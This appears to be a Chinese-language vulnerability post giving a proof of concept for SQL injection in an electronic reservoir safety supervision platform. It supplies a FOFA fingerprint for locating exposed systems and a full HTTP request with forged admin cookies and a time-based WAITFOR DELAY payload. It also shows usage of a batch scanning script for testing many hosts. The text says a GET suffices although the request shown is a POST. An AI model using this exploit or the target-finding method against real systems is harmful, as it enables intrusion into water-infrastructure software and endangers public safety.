# 某电子水库安全监管平台-存在sql注入漏洞

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与作者无关。该文章仅供学习用途使用！！！

fofa语法

js_name="js/PSExtend.js"

POC:

POST /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId HTTP/1.1
Host:
"Accept-Language": "zh-CN,zh;q=0.9"
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Cookie: currentuser=username=admin; usercookiename=usernames=admin;
Content-Length: 128

loginIdentifer=123&simcardId=123';WAITFOR DELAY '0:0:3'--



直接GET请求即可

![image-20231219105512392](assets/image-20231219105512392.png)

批量poc(记得安装库)

python poc.py -u 

![image-20231219105617309](assets/image-20231219105617309.png)

python poc.py -f  .txt

![image-20231219105706862](assets/image-20231219105706862.png)